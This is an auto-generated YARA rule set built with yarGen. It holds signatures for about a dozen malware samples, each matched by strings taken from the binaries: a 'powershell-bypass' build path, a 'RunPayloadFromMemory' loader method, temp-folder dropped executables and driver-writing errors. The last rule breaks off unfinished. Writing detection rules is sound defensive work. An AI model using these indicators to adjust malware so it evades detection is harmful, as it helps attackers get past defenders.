/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2023-07-19
   Identifier: mw
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751 {
   meta:
      description = "mw - file 06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751"
   strings:
      $x1 = "jK#GLcFjU*D)HhFmMaBz(^+cv+Larm/&EEO%Yg#QfINj#Mn&pte&pKOfJ/#HW#wOOsIjLPNz)NcJiJ*jUCZ@@svPmcwRHurJSSd(xyX^j$/UKMEds)Iv)aTdwkX$C/GB" wide /* score: '71.00'*/
      $x2 = "D:\\powershell-bypass-main\\Csharp\\obj\\x86\\Release\\windows.pdb" fullword ascii /* score: '35.00'*/
      $s3 = " https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->" fullword ascii /* score: '26.00'*/
      $s4 = "  <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '20.00'*/
      $s5 = " requestedExecutionLevel " fullword ascii /* score: '16.00'*/
      $s6 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s7 = "      <!-- Windows Vista -->" fullword ascii /* score: '12.00'*/
      $s8 = "      <!-- Windows 7 -->" fullword ascii /* score: '12.00'*/
      $s9 = "      <!-- Windows 8.1 -->" fullword ascii /* score: '12.00'*/
      $s10 = "      <!-- Windows 10 -->" fullword ascii /* score: '12.00'*/
      $s11 = "      <!-- Windows 8 -->" fullword ascii /* score: '12.00'*/
      $s12 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s13 = "      <longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii /* score: '12.00'*/
      $s14 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s15 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" />" fullword ascii /* score: '11.00'*/
      $s16 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s17 = "niubiniubiniubif" fullword wide /* score: '11.00'*/
      $s18 = " .NET Framework 4.6)" fullword ascii /* score: '10.00'*/
      $s19 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s20 = "          processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule sig_8897994e897bb1b2d22188d332ea972eff725b3b02b9dab0e5b5e73ab60d79c4 {
   meta:
      description = "mw - file 8897994e897bb1b2d22188d332ea972eff725b3b02b9dab0e5b5e73ab60d79c4"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "8897994e897bb1b2d22188d332ea972eff725b3b02b9dab0e5b5e73ab60d79c4"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "<RunPayloadFromMemory>b__0" fullword ascii /* score: '16.00'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s4 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s5 = "gH+tHsKNvsbZ1EWhvkP3EI/4krTieZANT0IAF7dhi4rYvHth2WCRnUgs3pnZNNdzV+fF2DM4tXqFk8/R+sF11/V8uT2G+0Jglr9qFD7nWN3TcH2IdXXT5szSY8lpN/c5" wide /* score: '11.00'*/
      $s6 = "'aeyeeqgi" fullword ascii /* score: '9.00'*/
      $s7 = "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 108.0) Gecko / 20100101 Firefox / 108.0" fullword wide /* score: '9.00'*/
      $s8 = "iikaiocckoeeg" fullword ascii /* score: '8.00'*/
      $s9 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii /* score: '7.00'*/
      $s10 = "JjI5uCO0.Resource.resources" fullword ascii /* score: '7.00'*/
      $s11 = "16.0.0.0" fullword ascii /* score: '6.00'*/
      $s12 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '5.00'*/
      $s13 = "yqgadc" fullword ascii /* score: '5.00'*/
      $s14 = "iikmij" fullword ascii /* score: '5.00'*/
      $s15 = "Chrome" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 25 times */
      $s16 = "chrome" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 28 times */
      $s17 = "GetProcesses" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s18 = "PaddingMode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 49 times */
      $s19 = "System.IO.Compression" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 51 times */
      $s20 = "CipherMode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 54 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3 {
   meta:
      description = "mw - file 281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3"
   strings:
      $s1 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s3 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s5 = "!Globalsign TSA for CodeSign1 - R60" fullword ascii /* score: '14.00'*/
      $s6 = "\\ziyuan\\Release\\ziyuan.pdb" fullword ascii /* score: '14.00'*/
      $s7 = "!Globalsign TSA for CodeSign1 - R6" fullword ascii /* score: '14.00'*/
      $s8 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s9 = "*http://crl3.digicert.com/assured-cs-g1.crl00" fullword ascii /* score: '13.00'*/
      $s10 = "*http://crl4.digicert.com/assured-cs-g1.crl0L" fullword ascii /* score: '13.00'*/
      $s11 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
      $s12 = "/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L" fullword ascii /* score: '13.00'*/
      $s13 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s14 = "[!] Failed to get resource's size" fullword ascii /* score: '12.00'*/
      $s15 = "(GlobalSign Timestamping CA - SHA384 - G40" fullword ascii /* score: '11.00'*/
      $s16 = "(GlobalSign Timestamping CA - SHA384 - G4" fullword ascii /* score: '11.00'*/
      $s17 = "!Beijing Qihu Technology Co., Ltd.0" fullword ascii /* score: '11.00'*/
      $s18 = "!Beijing Qihu Technology Co., Ltd.1*0(" fullword ascii /* score: '11.00'*/
      $s19 = "GlobalSign Root CA - R61" fullword ascii /* score: '11.00'*/
      $s20 = "[!] Failed to write driver" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule sig_2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe {
   meta:
      description = "mw - file 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
   strings:
      $x1 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s8 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" language=\"*\" processorArchitecture=\"*\" ver" ascii /* score: '27.00'*/
      $s9 = "Failed to get address for Tcl_FindExecutable" fullword ascii /* score: '27.00'*/
      $s10 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s11 = "bpython3.dll" fullword ascii /* score: '23.00'*/
      $s12 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s13 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s14 = "Failed to get address for Tcl_MutexUnlock" fullword ascii /* score: '23.00'*/
      $s15 = "5python39.dll" fullword ascii /* score: '23.00'*/
      $s16 = "Failed to get address for Tcl_MutexLock" fullword ascii /* score: '23.00'*/
      $s17 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s18 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s19 = "bapi-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s20 = "bapi-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 29000KB and
      1 of ($x*) and 4 of them
}

rule sig_5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44 {
   meta:
      description = "mw - file 5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
   strings:
      $s1 = "%TEMP%\\mzwtzbcli.exe" fullword ascii /* score: '26.00'*/
      $s2 = "%SystemRoot%\\System32\\calc.exe" fullword ascii /* score: '23.00'*/
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s5 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s6 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s7 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s8 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s9 = "vector too long" fullword ascii /* score: '6.00'*/
      $s10 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s11 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s12 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s13 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s14 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s15 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s16 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s17 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s18 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s19 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s20 = "permission denied" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 592 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule sig_73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8 {
   meta:
      description = "mw - file 73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
   strings:
      $s1 = "%TEMP%\\cveutxa.exe" fullword ascii /* score: '26.00'*/
      $s2 = "%SystemRoot%\\System32\\calc.exe" fullword ascii /* score: '23.00'*/
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s5 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s6 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s7 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s8 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s9 = "vector too long" fullword ascii /* score: '6.00'*/
      $s10 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s11 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s12 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s13 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s14 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s15 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s16 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s17 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s18 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s19 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s20 = "permission denied" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 592 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule sig_8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6 {
   meta:
      description = "mw - file 8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
   strings:
      $s1 = "%TEMP%\\xetytd.exe" fullword ascii /* score: '26.00'*/
      $s2 = "%SystemRoot%\\System32\\calc.exe" fullword ascii /* score: '23.00'*/
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s5 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s6 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s7 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s8 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s9 = "vector too long" fullword ascii /* score: '6.00'*/
      $s10 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s11 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s12 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s13 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s14 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s15 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s16 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s17 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s18 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s19 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s20 = "permission denied" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 592 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule a46f92dffeda6201d3504179c83397f2dd9bb24617b623b1aeaf3be3ce503058 {
   meta:
      description = "mw - file a46f92dffeda6201d3504179c83397f2dd9bb24617b623b1aeaf3be3ce503058"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "a46f92dffeda6201d3504179c83397f2dd9bb24617b623b1aeaf3be3ce503058"
   strings:
      $s1 = "hclmn210ji35.dll" fullword ascii /* score: '23.00'*/
      $s2 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s4 = "awoke. went. youth; arch, fool; roam, bus; thoughtfully, laboratory; closed. inside prevailed" fullword ascii /* score: '7.00'*/
      $s5 = " :(:0:4:8:<:@:D:H:L:T:X:\\:`:d:h:l:p:|:" fullword ascii /* score: '7.00'*/
      $s6 = "MRYRSBD" fullword wide /* score: '6.50'*/
      $s7 = "consists rescue" fullword ascii /* score: '6.00'*/
      $s8 = "interested in writing about them" fullword ascii /* score: '6.00'*/
      $s9 = "hip breeches" fullword ascii /* score: '6.00'*/
      $s10 = "stroll hats" fullword ascii /* score: '6.00'*/
      $s11 = "Organic" fullword wide /* score: '6.00'*/
      $s12 = "9.0.1.0" fullword wide /* score: '6.00'*/
      $s13 = "Actress" fullword wide /* score: '6.00'*/
      $s14 = "boarding. barren, reel. delirium, apologies# storey# cab# stayed" fullword ascii /* score: '5.00'*/
      $s15 = "natural government monsters, usually. captain, mass; ahead" fullword ascii /* score: '5.00'*/
      $s16 = "  </trustInfo>" fullword ascii /* score: '4.00'*/
      $s17 = "lately" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "|$(PWQRVSU" fullword ascii /* score: '4.00'*/
      $s19 = "winning" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "ROXAD356x" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460 {
   meta:
      description = "mw - file aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
   strings:
      $s1 = "%TEMP%\\azpkipnpyg.exe" fullword ascii /* score: '26.00'*/
      $s2 = "%SystemRoot%\\System32\\calc.exe" fullword ascii /* score: '23.00'*/
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s5 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s6 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s7 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '7.00'*/
      $s8 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s9 = "vector too long" fullword ascii /* score: '6.00'*/
      $s10 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s11 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s12 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s13 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s14 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s15 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s16 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s17 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s18 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s19 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s20 = "permission denied" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 592 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule sig_568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298 {
   meta:
      description = "mw - file 568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"Process Explorer\" version" ascii /* score: '53.00'*/
      $x2 = "semblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicK" ascii /* score: '36.00'*/
      $s3 = "C:\\agent\\_work\\68\\s\\sys\\x64\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s4 = "C:\\agent\\_work\\68\\s\\sys\\Win32\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s5 = "gAutoruns - Sysinternals: www.sysinternals.com" fullword wide /* score: '29.00'*/
      $s6 = "SCRIPTRUNNER.EXE" fullword wide /* score: '28.00'*/
      $s7 = "C:\\agent\\_work\\68\\s\\exe\\Release\\procexp.pdb" fullword ascii /* score: '27.00'*/
      $s8 = "C:\\agent\\_work\\68\\s\\exe\\x64\\Release\\procexp64.pdb" fullword ascii /* score: '27.00'*/
      $s9 = "taskhostw.exe" fullword wide /* score: '27.00'*/
      $s10 = "These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please rea" wide /* score: '25.00'*/
      $s11 = "The software is subject to United States export laws and regulations.You must comply with all domestic and international export " wide /* score: '25.00'*/
      $s12 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s13 = "rity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedP" ascii /* score: '23.00'*/
      $s14 = "crosoft.com/exporting }}{\\fldrslt{www.microsoft.com/exporting}}}}\\cf1\\ul\\f0\\fs19  <{{\\field{\\*\\fldinst{HYPERLINK \"http:" ascii /* score: '23.00'*/
      $s15 = "rosoft.com/exporting\"}}{\\fldrslt{http://www.microsoft.com/exporting}}}}\\f0\\fs19 >\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '23.00'*/
      $s16 = "* use the software for commercial software hosting services." fullword wide /* score: '23.00'*/
      $s17 = "yedputil.dll" fullword wide /* score: '23.00'*/
      $s18 = "Environment\\UserInitMprLogonScript" fullword wide /* score: '21.00'*/
      $s19 = "https://www.virustotal.com" fullword wide /* score: '21.00'*/
      $s20 = "EdpGetContextForProcess" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule sig_7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938 {
   meta:
      description = "mw - file 7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"Process Explorer\" version" ascii /* score: '53.00'*/
      $x2 = "semblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicK" ascii /* score: '36.00'*/
      $s3 = "C:\\agent\\_work\\68\\s\\sys\\x64\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s4 = "C:\\agent\\_work\\68\\s\\sys\\Win32\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s5 = "gAutoruns - Sysinternals: www.sysinternals.com" fullword wide /* score: '29.00'*/
      $s6 = "SCRIPTRUNNER.EXE" fullword wide /* score: '28.00'*/
      $s7 = "C:\\agent\\_work\\68\\s\\exe\\Release\\procexp.pdb" fullword ascii /* score: '27.00'*/
      $s8 = "C:\\agent\\_work\\68\\s\\exe\\x64\\Release\\procexp64.pdb" fullword ascii /* score: '27.00'*/
      $s9 = "taskhostw.exe" fullword wide /* score: '27.00'*/
      $s10 = "These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please rea" wide /* score: '25.00'*/
      $s11 = "The software is subject to United States export laws and regulations.You must comply with all domestic and international export " wide /* score: '25.00'*/
      $s12 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s13 = "rity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedP" ascii /* score: '23.00'*/
      $s14 = "crosoft.com/exporting }}{\\fldrslt{www.microsoft.com/exporting}}}}\\cf1\\ul\\f0\\fs19  <{{\\field{\\*\\fldinst{HYPERLINK \"http:" ascii /* score: '23.00'*/
      $s15 = "rosoft.com/exporting\"}}{\\fldrslt{http://www.microsoft.com/exporting}}}}\\f0\\fs19 >\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '23.00'*/
      $s16 = "* use the software for commercial software hosting services." fullword wide /* score: '23.00'*/
      $s17 = "yedputil.dll" fullword wide /* score: '23.00'*/
      $s18 = "Environment\\UserInitMprLogonScript" fullword wide /* score: '21.00'*/
      $s19 = "https://www.virustotal.com" fullword wide /* score: '21.00'*/
      $s20 = "EdpGetContextForProcess" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb {
   meta:
      description = "mw - file dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
   strings:
